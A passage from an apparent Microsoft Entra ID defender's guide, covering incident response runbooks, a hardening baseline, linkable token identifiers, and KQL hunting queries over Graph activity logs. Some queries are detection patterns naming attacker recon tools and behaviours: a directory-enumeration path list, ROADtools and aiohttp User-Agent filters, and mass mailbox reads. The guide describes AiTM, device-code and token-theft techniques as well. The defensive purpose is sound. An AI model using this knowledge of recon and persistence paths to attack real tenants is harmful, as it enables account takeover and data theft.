### IR-2: Suspected token theft / AiTM phishing

1. **Identify the user and session.** From the suspicious sign-in row, get `UserPrincipalName`, `CorrelationId`, `SessionId`.
2. **Revoke the user's sessions.** `Revoke-MgUserSignInSession -UserId <upn>`. Forces all clients to re-authenticate.
3. **Rotate credentials.** Reset password. Re-register MFA from a known-good device. If they had a FIDO2 key, consider reissuing.
4. **Mark user as compromised** in Identity Protection. This forces password change at next sign-in and triggers any user-risk policies.
5. **Hunt the attacker's session.** Pivot on `SessionId` in non-interactive logs to see what they did. Check Exchange mailbox rules — AiTM often plants a rule to forward replies to attacker-controlled inbox or move them to deleted items.
6. **Check for persistence.** Did the attacker register an authentication method (added a phone number, registered a new MFA device)? Did they create an app registration? Add a credential to one?
7. **If any persistence found** — full IR with affected user-list expanded to anyone the compromised account had access to.

### IR-3: Suspected service principal compromise

1. **Identify the SP.** From sign-in logs, get `AppId`, `ServicePrincipalId`.
2. **Disable the SP** if the app is non-critical: `Update-MgServicePrincipal -ServicePrincipalId <id> -AccountEnabled:$false`.
3. **Rotate all credentials** on the app. Delete every secret and certificate, generate new ones.
4. **Identify what the app accessed.** Pivot on `AppId` in `AADServicePrincipalSignInLogs` — every resource it got a token for.
5. **Pull resource-side logs.** Graph activity, Exchange app-only access, SharePoint app actions, Azure RBAC changes (the app's Azure roles).
6. **Investigate the leak vector.** Was the secret in a Git repo? CI logs? A developer's machine? Treat the leak path itself as a separate compromise.
7. **Move to certificate or federated credential** post-incident if not already.

### IR-4: Suspected admin account compromise

1. **Disable the account.**
2. **Revoke all sessions.**
3. **Audit all changes the account made** in `AuditLogs` over the suspect window — apps registered, consents granted, role assignments, policy changes.
4. **Reverse the changes.** Every app the account registered → review and likely delete. Every consent granted → revoke. Every role assignment → reverse.
5. **Audit credential additions to existing apps** (the persistence move from §9). Reverse those.
6. **Check break-glass accounts.** If those have been touched, treat as tenant compromise.
7. **Review CA policy modifications** — any new exclusions, disabled policies, weakened conditions need to be reverted.

---

## 18. Tenant hardening baseline

The minimum-viable Entra hardening, in approximate order of impact-to-effort:

**Tier 1 — do this week:**
1. Block legacy authentication (Conditional Access).
2. Enforce MFA for all users (CA).
3. Set user consent to "verified publishers, selected permissions only."
4. Enable admin consent workflow.
5. Block device code flow (CA, with documented exceptions).
6. Two break-glass accounts, hardware keys, monitored.

**Tier 2 — do this month:**
7. Identity Protection sign-in and user risk policies.
8. Block legacy ROPC apps (audit them out, then block protocol).
9. Phishing-resistant MFA for all admins (FIDO2 / Windows Hello / cert).
10. Token Protection (CA session control) for high-value apps.
11. Move all confidential clients off secrets onto certs or workload identity federation.
12. PIM for all admin roles — eligible, not active.

**Tier 3 — do this quarter:**
13. App governance (Defender for Cloud Apps).
14. Access reviews on privileged roles (quarterly) and app consents (semi-annually).
15. Cross-tenant access settings — explicit allowlists, not "any tenant."
16. Authentication strengths configured per app sensitivity.
17. Audit and disable stale guest accounts.

**Continuous:**
- All detections in §10 wired to your SIEM.
- The hunt queries in §11 run weekly with someone reviewing.
- Sign-in log volume monitored — sudden spikes from an app or user are themselves a signal.
- Quarterly privilege review and red-team exercise focused on the consent-grant attack path specifically.

---

## 19. Linkable Token Identifiers

Microsoft made **linkable token identifiers** (sometimes "linkable identifiers") generally available on 21 July 2025. They solve a problem every IR person hit before: stitching one sign-in to all the workload activity it produced. Pre-LTI, you had a sign-in row in `SigninLogs`, and you had Exchange/SharePoint/Teams/Graph audit events somewhere else, and joining them meant time-window heuristics on UPN + IP + UA — slow, lossy, and wrong often enough to matter.

LTI fixes that by embedding persistent identifiers in every Entra-issued token, and exposing them in the matching workload audit logs.

### The four identifiers

Microsoft surfaces four identifiers in the LTI investigative pattern. Two are *new* with LTI; the other two have been in sign-in logs for years but are now formally part of the cross-log correlation toolkit. In the Entra admin portal they all appear together — SID, UTI, and User ID under the Basic Info pane of a sign-in row, Device ID under the Devices pane.

**Session ID (SID)** — *new with LTI.* One GUID per *root authentication event*. When the user signs in interactively, Entra mints a SID. Every token issued during that session — access tokens, refresh tokens, session cookies, every silent renewal — carries the same SID. Workload audit logs include it with each action. So if a user authenticates once and then spends 8 hours in Outlook, SharePoint, Teams, and Graph, every action across all four services shares one SID.

**Unique Token Identifier (UTI)** — *new with LTI.* One GUID per *individual token*. Each access token gets its own UTI; a refresh token redeemed for new ATs gets a new UTI for each new AT. UTI is the identifier you reach for when you want to know "what did *this specific token* access?" — useful when you've identified one specific token as compromised and want to scope blast radius without ending the whole session.

**User ID (`oid`)** — *pre-existing, now part of the LTI story.* The user's stable directory object ID. Unlike UPN, this doesn't change on rename, so it's the right join key for cross-log correlation that has to survive identity changes.

**Device ID** — *pre-existing, now part of the LTI story.* The Entra-registered or domain-joined device's object ID. Surfaces in `DeviceDetail.deviceId` on the sign-in row, and only when the device is actually registered/joined — sign-ins from unmanaged personal devices have no Device ID. This is the high-signal one for separating "Alice signed in from her corporate laptop" from "Alice signed in from a device the tenant has never seen." For LTI investigation, it lets you scope hunts to *one device's* activity within a session.

The relationships:

- One SID has many UTIs (one per token issued under it).
- One SID is tied to one User ID and (usually) one Device ID, set at the moment of root authentication.
- All four travel together in workload audit logs where supported.

### Where they appear

In `SigninLogs` the fields are:

- `SessionId` — the SID (new with LTI)
- `UniqueTokenIdentifier` — the UTI (new with LTI)
- `UserId` — the user's object ID (always present)
- `DeviceDetail.deviceId` — the device's object ID (present only for registered/joined devices)

In **workload logs**, the identifiers carry forward into the audit events. Coverage as of GA:

| Log source | SID | UTI | UserId | DeviceId |
|---|---|---|---|---|
| Entra `SigninLogs` | Yes (`SessionId`) | Yes (`UniqueTokenIdentifier`) | Yes (`UserId`) | Yes (`DeviceDetail.deviceId`) |
| Entra `AADNonInteractiveUserSignInLogs` | Yes | Yes | Yes | Yes |
| Exchange Online (Unified Audit Log) | Yes | Yes | Yes | Partial |
| SharePoint Online (Unified Audit Log) | Yes | Yes | Yes | Partial |
| Microsoft Teams (Unified Audit Log) | Yes | Yes | Yes | Partial |
| `MicrosoftGraphActivityLogs` | Yes | Yes | Yes | Yes |
| `AADGraphActivityLogs` | Yes | Yes (with a quirk — see below) | Yes | Yes |
| Entra `AuditLogs` | **No** | **No** | Yes (initiator) | **No** |
| Azure Activity Logs | **No** | **No** | Yes (caller) | **No** |

"Partial" for Device ID in workload logs reflects that coverage is still being filled in across the Office workloads — sometimes present, sometimes not, depending on the operation type. The two "No" rows for SID/UTI are real gaps: configuration changes (consent grants, app registrations, role assignments — the things in `AuditLogs`) are *not* tagged with SID/UTI yet, so you can't use LTI to answer "which session granted this consent" directly. You join on UPN/UserId + time window for those, same as before.

### Investigation pattern

The canonical workflow:

1. Start with a suspicious row in `SigninLogs` — risky sign-in, atypical IP, whatever triggered the alert.
2. Note the `SessionId`. (And `UniqueTokenIdentifier` if you want to scope to one token.)
3. Pivot to workload audit logs filtered by that SID. In Microsoft Purview's Audit Search, the `SessionId` goes in the **Keyword Search** field — *not* a typed filter. Microsoft's workload teams were inconsistent about how the SID is embedded in `AuditData` payloads, so a free-text keyword search is the only thing that catches all of them reliably.
4. Now you have the full sequence of actions that session performed across Exchange, SharePoint, Teams, and Graph — in chronological order, attributable to one authentication.

KQL example for Sentinel users — find all activity for a session, given a suspicious sign-in:

```kql
let suspect = SigninLogs
| where TimeGenerated > ago(7d)
| where UserPrincipalName == "alice@contoso.onmicrosoft.com"
| where RiskLevelDuringSignIn == "high"
| project SessionId, UniqueTokenIdentifier, SignInTime = TimeGenerated;
let sid = toscalar(suspect | summarize take_any(SessionId));
union
    (SigninLogs               | where SessionId == sid),
    (AADNonInteractiveUserSignInLogs | where SessionId == sid),
    (MicrosoftGraphActivityLogs | where SessionId == sid),
    (OfficeActivity            | where AADSessionId == sid)   // UAL-shaped table
| project TimeGenerated, _Type = $table, AppDisplayName, ResourceDisplayName,
          Operation = coalesce(column_ifexists("OperationName", ""),
                               column_ifexists("Operation", "")),
          IPAddress = coalesce(column_ifexists("IPAddress", ""),
                               column_ifexists("ClientIp", ""))
| sort by TimeGenerated asc
```

That gives you a single timeline. The same technique with `UniqueTokenIdentifier` instead of `SessionId` scopes to one token.

For PowerShell, the Microsoft Graph beta `Get-MgBetaAuditLogSignIn` cmdlet exposes `SessionId` (the v1 cmdlet doesn't currently — you need the beta one).

### Field gotchas

A few things people hit in practice:

**Padding inconsistency.** `AADGraphActivityLogs` stores `UniqueTokenIdentifier` with trailing `==` base64 padding; `SigninLogs` strips it. When joining across those two tables, normalize one side or the join silently misses everything. The exact same UTI looks different in the two tables until you account for it.

**UAL field name.** In the Unified Audit Log (`OfficeActivity` table in Sentinel), the SID is recorded as `AADSessionId`, not `SessionId`. The UTI may also surface under different names depending on the workload (e.g., embedded in the `AuditData` JSON payload rather than as a top-level column). When in doubt, free-text search the GUID across the AuditData blob.

**Audit Logs & Azure Activity Logs gap.** `AuditLogs` (consent grants, app credential adds, role assignments) and Azure Activity Logs (control-plane operations) currently don't carry SID/UTI. So "what session granted this consent" or "what session deployed this resource" still requires the old UPN+time-window join.

**Coverage caveats.** Microsoft is still expanding LTI coverage. The list above is correct as of late 2025; expect more workloads to gain SID/UTI fields over time. If a workload you care about is missing, check Microsoft Learn's "Track and investigate identity activities with linkable identifiers" page for the current coverage table.

### When LTI helps — and when it doesn't

LTI is genuinely transformative for **AiTM phishing investigation**. The attacker initiates a fresh authentication via their proxy, which produces a *different* SessionId from the user's legitimate sessions, on a *different* DeviceId (the proxy's, or none at all if the attacker's environment isn't registered). Once you find the malicious sign-in row, you can scope all attacker activity by SID + DeviceId and cleanly separate it from the user's parallel legitimate work. The combination is what makes the AiTM scoping reliable — DeviceId alone or SID alone is weaker.

LTI is **less useful**, in some cases not useful at all, for two attack patterns:

- **Device code phishing.** The attacker initiates the device code flow but the *user* completes it on the user's own device. Entra issues tokens with one SID, and that SID is the same on both sides — the legitimate device that finished the prompt and the attacker's polling session. The DeviceId on the resulting sign-in row is the *user's* device, not the attacker's, because that's where the authentication factor was provided. Both SID and DeviceId are useless for separating attacker from user here. (This is the Bluraven research point — they verified empirically that Azure CLI device-code flows produce sign-ins where SessionId and DeviceId both match the victim's session.)
- **Token / PRT / cookie theft.** The attacker steals tokens that were already issued in a legitimate session, then reuses them. The stolen tokens carry the user's original SID and the user's DeviceId. Same problem as device code: both LTI fields are inherited from the legitimate session, so neither isolates the attacker.

For both of those, you still need the supporting signals — IP, ASN, user agent, time-of-day patterns, the *destination* of the attacker's actions (mass downloads, inbox rules, mailbox sends to external recipients). LTI sharpens AiTM investigation specifically; it's not a universal solvent for token-reuse attacks.

### Quick reference: how this connects to the rest of the guide

A few practical implications for the detections elsewhere in this guide:

- The §4 Azure Portal worked example — those 20+ log rows for one user click — share one `SessionId` if the user authenticated once and stayed in CAE-bound territory. Replace your old "join on UPN + time window" with `SessionId` for cleaner reconstructions.
- §6 OAuth phishing investigation: when triaging a `Consent to application` audit event, you currently can't pivot back to a session via SID (audit logs don't carry it yet). Pivot via UPN + time window to the `SigninLogs` row that preceded the consent, then use *that* row's `SessionId` to chase what the malicious app did with its newly-acquired tokens.
- §13 incident response runbook for compromised account: after revoking sessions, use the SID of the suspect sign-in to enumerate exactly what happened during it. This is where LTI most cleanly closes a gap that used to take hours of correlation work.

---

## 20. Microsoft Graph activity logs and the legacy AAD Graph

Sign-in logs tell you *who got a token*. They don't tell you *what they did with it*. For that, you need the Graph activity logs — the audit trail of every HTTP request the Graph service processed for your tenant. This is the layer where exfiltration, reconnaissance, and persistence operations actually happen, and skipping it means you're investigating attacks blind to their second half.

There are two Graph endpoints, and therefore two activity log tables.

### The two Graph endpoints

**`graph.microsoft.com` — Microsoft Graph.** The modern, supported, actively-developed API. Everything Microsoft has built since ~2017 lives here: M365 services, Azure AD/Entra management, Defender XDR, Teams, Intune. New features ship here first and often only here. Modern SDKs (`Microsoft.Graph` PowerShell, `microsoft-graph-sdk-python`, the `@azure/msal-*` JS libraries) all target this endpoint.

**`graph.windows.net` — Azure AD Graph (AAD Graph).** The legacy API. Microsoft has been deprecating it since 2019 — but it still works, and that "still works" is the problem. The classic `AzureAD` and `MSOnline` PowerShell modules talk to AAD Graph directly. Some older SaaS integrations still call it. Some Microsoft-internal tools historically called it. And — crucially — for years it had **no per-request audit logging**. Attackers learned this. AAD Graph became the defender's blind spot, and red-team tooling like ROADrecon explicitly preferred it because of that.

That changed in late 2025: `AADGraphActivityLogs` started flowing into Log Analytics workspaces that had enabled the diagnostic setting. Many tenants enabled it in May 2025 and saw nothing for ~6 months — then suddenly data appeared. If you enabled this and never came back to check, **check now**, because attacks that were invisible during the gap are visible going forward.

### The two log tables

Both tables capture the same conceptual thing — an HTTP request to Graph — but with slightly different schemas because Microsoft's two log pipelines were built years apart by different teams.

| Aspect | `MicrosoftGraphActivityLogs` | `AADGraphActivityLogs` |
|---|---|---|
| Endpoint | `graph.microsoft.com` | `graph.windows.net` |
| Status | Modern, GA since late 2023 | Legacy, data flowing since late 2025 |
| Volume | Very high — every Graph SDK call lands here | Lower (and shrinking as apps migrate), but high per-attacker-tool because legacy attacker tooling concentrates here |
| Caller IP field | `IPAddress` | `CallerIpAddress` |
| App identifier | `AppId` | `AppId` |
| User identifier | `UserId` | `UserId` |
| Service principal identifier | `ServicePrincipalId` | `ServicePrincipalId` |
| Scopes/roles in token | `Roles` (array) | `Roles` (array) |
| Request URI | `RequestUri` | `RequestUri` |
| HTTP method | `RequestMethod` | `RequestMethod` |
| Response code | `ResponseStatusCode` | `ResponseStatusCode` |
| Correlation back to sign-in | `SignInActivityId` (joins to `UniqueTokenIdentifier`) | `UniqueTokenIdentifier` (with `==` padding quirk — see §19) |
| Sub-request grouping | `OperationId` (groups `$batch` children) | `OperationId` |

The naming inconsistency on `IPAddress` vs `CallerIpAddress` is real and bites people writing union queries across the two tables. Always normalize when joining:

```kql
union 
    (MicrosoftGraphActivityLogs | extend SourceIp = IPAddress),
    (AADGraphActivityLogs       | extend SourceIp = CallerIpAddress)
| project TimeGenerated, SourceIp, AppId, UserId, RequestUri, RequestMethod, ResponseStatusCode
```

Without that extension, half your data has empty IPs and you don't notice until the detection misfires.

### Reading a Graph activity log row

A typical row contains:

- **Who** — `AppId` (the app that made the call), `UserId` (the user the token was issued for, if delegated), `ServicePrincipalId` (the SP, if app-only).
- **What** — `RequestMethod` + `RequestUri`. `GET https://graph.microsoft.com/v1.0/users` is "list all users." `POST https://graph.microsoft.com/v1.0/applications/{id}/addPassword` is "add a credential to that app" (the persistence move from §13).
- **With what authority** — `Roles` array contains the scopes/permissions that were in the access token. This tells you *what the token was capable of*, not just *what it did*. An app calling `/me` with `Directory.ReadWrite.All` in its `Roles` array is a misconfigured app — the call was benign, the *token* is over-privileged.
- **Result** — `ResponseStatusCode`. 200/201/204 = success. 401 = bad token. 403 = token valid but lacks the required role. 429 = rate limited. 5xx = Graph itself errored.
- **Stitching back** — `SignInActivityId` joins to `UniqueTokenIdentifier` in the sign-in tables, so you can pivot a Graph call back to the exact sign-in event that produced its token.

The `RequestUri` column is the most information-rich and the most painful to query. It's a full URL string, often very long (delta tokens, `$filter` expressions, OData query options). Searching it with `has` or `contains` works but is slow and prone to false positives. The standard pattern is to parse it once with `parse_url()` and project a normalized path:

```kql
MicrosoftGraphActivityLogs
| extend Path = tostring(parse_url(RequestUri).Path)
| extend NormalizedPath = replace_string(replace_string(Path, "v1.0/", ""), "beta/", "")
| extend Resource = tostring(split(NormalizedPath, "/")[2])
| project TimeGenerated, AppId, UserId, RequestMethod, NormalizedPath, Resource, ResponseStatusCode
```

`Resource` (the third path segment) gives you the high-level Graph resource — `users`, `groups`, `applications`, `directoryRoles`, `serviceprincipals`, `me`, `messages`, `drives`. This is what you summarize on for behavioral analysis.

### `$batch` calls and `OperationId`

This is the single most important thing to internalize about Graph activity logs, because if you don't, your detections will undercount attacker activity by 90%+.

The Graph API supports a `$batch` endpoint that lets a client send up to 20 sub-requests in a single HTTP POST and get up to 20 responses back. Microsoft Graph SDKs use it aggressively for performance — modern clients almost never make individual calls when they can batch. Attacker tooling does too, because batching is faster.

Here's the deceptive part: the Graph activity logs **record the parent `$batch` POST as its own row, and each sub-request as its own row**. The parent has a `RequestUri` of `https://graph.microsoft.com/v1.0/$batch` (or `/beta/$batch`), `RequestMethod` of `POST`, and tells you nothing about what was actually requested. The children have the real `RequestMethod` (often `GET`, `PATCH`, `DELETE`) and the real `RequestUri` (the actual API endpoints).

If you write a detection like `where RequestUri has "/users"`, you find the children but lose context — you can't see they were part of a batch, can't see the other batched operations they ran alongside, and can't easily attribute them to one logical client call. If you filter on `RequestMethod == "POST"` you find the parent batch but miss what's inside it.

**The link between parent and children is `OperationId`**. All sub-requests of one `$batch` POST share the parent's `OperationId`. This is the canonical join pattern (originally documented by Cloudbrothers, the standard reference):

```kql
// Parent $batch POSTs
let batches = MicrosoftGraphActivityLogs
| where TimeGenerated > ago(1d)
| where RequestMethod == "POST" and RequestUri endswith "/$batch"
| project OperationId, BatchTime = TimeGenerated, BatchAppId = AppId, BatchUserId = UserId,
          BatchIp = IPAddress;
// Children — every other call
let children = MicrosoftGraphActivityLogs
| where TimeGenerated > ago(1d)
| where not(RequestMethod == "POST" and RequestUri endswith "/$batch")
| project-rename ChildRequestUri = RequestUri, ChildRequestMethod = RequestMethod;
batches
| join kind=inner children on OperationId
| project BatchTime, OperationId, BatchAppId, BatchUserId, BatchIp,
          ChildRequestMethod, ChildRequestUri, ResponseStatusCode
| sort by BatchTime asc, OperationId
```

This gives you, for each `$batch`, the full list of sub-operations it actually performed. Now you can reason about it like a single client action — "this batch read 17 users and updated one group" instead of 18 unrelated rows.

Two practical implications:

1. **Detection rules that look at `RequestUri`** should be aware that the same operation can appear either as a standalone call or as a sub-request of a `$batch`. Filter for both patterns. A query that only catches `where RequestUri has "/applications/" and RequestMethod == "PATCH"` will miss the same operation when it arrives via `$batch`.
2. **Counting unique attacker operations** by `count()` over `MicrosoftGraphActivityLogs` rows over-counts when batches are involved (parent + children all count) and undercounts the *intent* (one logical batch is one decision the attacker made, not 20). For behavioral analysis use `count_distinct(OperationId)` for "logical operations" and the row count for "raw API calls."

### High-value detection patterns

The Graph activity logs are where post-compromise behavior becomes visible. A non-exhaustive list of the patterns worth building rules on:

**Mass mailbox enumeration via Graph.** A token with `Mail.Read` reading every user's mailbox in sequence is the OAuth phishing payoff path. The KQL fingerprint:

```kql
MicrosoftGraphActivityLogs
| where TimeGenerated > ago(7d)
| where RequestMethod == "GET"
| where RequestUri matches regex @"/users/[^/]+/messages"
| where ResponseStatusCode in (200, 206)
| summarize MailboxesAccessed = dcount(extract(@"/users/([^/]+)/messages", 1, RequestUri)),
            CallCount = count(),
            FirstSeen = min(TimeGenerated),
            LastSeen = max(TimeGenerated)
    by AppId, UserId, IPAddress
| where MailboxesAccessed > 5
| sort by MailboxesAccessed desc
```

Tune the `> 5` threshold to your environment. A single user reading their own mailbox is normal (one mailbox); an OAuth-phished app reading 50 mailboxes in 10 minutes isn't.

**Directory enumeration as reconnaissance.** Attacker tooling like ROADrecon, AzureHound, AADInternals, BloodHound's Azure collector all hit a recognizable shopping list of endpoints — `/users`, `/groups`, `/serviceprincipals`, `/applications`, `/directoryRoles`, `/policies`, `/conditionalAccess/policies`, `/domains`. Any one is normal; the *combination*, in tight time succession, from one app/user, is reconnaissance:

```kql
let recon_paths = dynamic([
    "/users", "/groups", "/serviceprincipals", "/applications",
    "/directoryroles", "/policies/conditionalaccesspolicies",
    "/domains", "/organization", "/directoryobjects"
]);
union 
    (MicrosoftGraphActivityLogs | extend SourceIp = IPAddress),
    (AADGraphActivityLogs       | extend SourceIp = CallerIpAddress)
| where TimeGenerated > ago(1d)
| where RequestMethod == "GET"
| extend NormalizedPath = tolower(replace_string(replace_string(
    tostring(parse_url(RequestUri).Path), "v1.0/", ""), "beta/", ""))
| where NormalizedPath has_any (recon_paths)
| extend HitPath = tostring(array_iff(NormalizedPath has_any (recon_paths), NormalizedPath, ""))
| summarize DistinctPaths = dcount(NormalizedPath),
            PathList = make_set(NormalizedPath, 20),
            CallCount = count(),
            FirstSeen = min(TimeGenerated)
    by AppId, UserId, ServicePrincipalId, SourceIp
| where DistinctPaths >= 5
| sort by DistinctPaths desc
```

Catches tools that systematically enumerate the directory regardless of whether they prefer Graph, AAD Graph, or both. The Invictus IR research notes that some attacker tools have signature User-Agents (e.g., `python` + `aiohttp` for ROADrecon) — adding a `UserAgent` filter sharpens this further but at the cost of evading attackers who change their UA.

**The `aiohttp` / known-tool fingerprint specifically:**

```kql
AADGraphActivityLogs
| where TimeGenerated > ago(7d)
| where UserAgent has_any ("aiohttp", "python-requests", "ROADtools")
| summarize CallCount = count(), DistinctPaths = dcount(RequestUri)
    by CallerIpAddress, AppId, UserAgent
| sort by CallCount desc
```

A legitimate Python-based admin tool occasionally hits Graph from `aiohttp` — Datadog's app, some Microsoft-owned tooling. Allowlist the legitimate ones (by `AppId`) and the rest of the signal is high-fidelity.

**App permissions never used — and now suddenly used.** The §15 hunt query for "stale apps that have never been used" works against sign-in logs but is sharper against Graph activity logs, because `Roles` tells you the *granted scopes that were exercised* on each call. An app consented to `Mail.ReadWrite` but never seen reading mail in 90 days, suddenly reading mail today, is a strong signal. Build a baseline of which scopes each app actually exercises and alert on first-use of dormant scopes.

**Privileged role assignment via Graph.** The Graph endpoint `POST /roleManagement/directory/roleAssignments` adds someone to a directory role. Worth alerting on unconditionally:

```kql
MicrosoftGraphActivityLogs
| where TimeGenerated > ago(1d)
| where RequestMethod == "POST"
| where RequestUri has "/roleManagement/directory/roleAssignments"
| where ResponseStatusCode in (201, 204)
| project TimeGenerated, AppId, UserId, ServicePrincipalId, IPAddress, RequestUri, SignInActivityId
```

Pivot on `SignInActivityId` → join to `UniqueTokenIdentifier` in sign-in logs → understand the session that did this.

### Caveats

A few things to know before you build production detections:

**Volume and cost.** `MicrosoftGraphActivityLogs` is *very* high volume in any active tenant — easily multiple GB/day for a mid-sized org. Sentinel ingestion charges apply. Microsoft's "Defender XDR auxiliary table" (`GraphApiAuditEvents`, GA in 2025) covers most of the same data at no ingest cost, but with 30-day retention vs. whatever you set in Sentinel. Many tenants now use `GraphApiAuditEvents` for the bulk and keep `MicrosoftGraphActivityLogs` ingestion limited to high-value subsets via diagnostic settings filters or table-level filters.

**Coverage gaps.** Microsoft's own docs note: "Activity logs from Microsoft applications might not all have matching sign-in log entries." First-party Microsoft services sometimes generate Graph activity without a corresponding `SigninLogs` entry — meaning your "join sign-in to Graph activity" queries will have unmatched rows that are *not* attacker behavior. This is consistent with the broader pattern that some Microsoft-internal flows produce Graph activity outside the normal token-issuance path.

**Some tenant operations bypass Graph entirely.** Configuration changes done through the Azure Portal admin pages don't always go through Graph — some hit private Microsoft APIs that don't appear in `MicrosoftGraphActivityLogs` at all. They appear in `AuditLogs` (the directory audit) but with `CorrelationId` joins that don't always match. The Cloudbrothers research found ~73 audit events in their test tenant with no matching Graph activity log entry. Implication: don't treat absence-from-Graph-logs as proof an action wasn't taken; pair Graph activity logs with `AuditLogs` for full coverage.

**`ClientRequestId` as the better correlation key.** Cloudbrothers' research found that `ClientRequestId` (set by the client, propagated through Graph) is a more reliable correlation key than `OperationId` or `RequestId` for joining `AuditLogs` to `MicrosoftGraphActivityLogs`. `OperationId` is what groups `$batch` children together (use that for batch joins), but for joining a single Graph call to its corresponding audit event, `ClientRequestId` is the better anchor.

**Schema evolution.** Microsoft has changed column names mid-flight before — `IpAddress` was renamed to `IPAddress` between preview and GA on the modern table, breaking everyone's saved queries. Treat schemas as Microsoft-can-change-anytime and check column names if a query suddenly returns empty.

### How this connects to the rest of the guide

A few practical ties back to earlier sections:

- The **OAuth phishing investigation in §11** ends with "now hunt the malicious app's activity." This is the table you hunt in. Pivot on the attacker's `AppId` in `MicrosoftGraphActivityLogs` to see exactly which mailboxes/files were accessed, with what scopes, from what IP. The `Roles` array on each call tells you which scopes the attacker's token actually exercised.
- **Service principal credential abuse from §13** is most cleanly investigated by joining `AuditLogs` (the credential add) to `MicrosoftGraphActivityLogs` (the subsequent activity) on `AppId` — the credential add audit row gives you the time anchor; the Graph activity log shows what the new credential's tokens were used for.
- **Linkable Token Identifiers from §19** join Graph activity logs to sign-in logs via `SignInActivityId` ↔ `UniqueTokenIdentifier`. This is the cleanest way to scope a session-wide investigation including its API-layer activity. Watch out for the `==` padding quirk on the AAD Graph table.

The bottom line: sign-in logs are where you discover compromise; Graph activity logs are where you assess its impact. A defender who only watches sign-in logs sees attackers walk in the door; a defender who also watches Graph activity logs sees what they took on the way out.

---

## Closing notes

Two principles that, if internalized, will make you better at this than checklists ever will:

**Authenticate is a verb that produces tokens, and tokens are what attackers want.** The user typing a password is a footnote. The token issued at the end of any flow is what gives the attacker access, persistence, and the ability to move laterally. Detection that doesn't track tokens — issuance, refresh, redemption against resources — is just watching the door.

**The sign-in is the start of the session, not the session itself.** A clean `SigninLogs` row tells you the user (or attacker) authenticated successfully. The hours of activity afterward, in `AADNonInteractiveUserSignInLogs` and the resource-side logs, are where you learn what they did. Build detections that span that timeline, not just the moment of sign-in.

Everything else is implementation detail.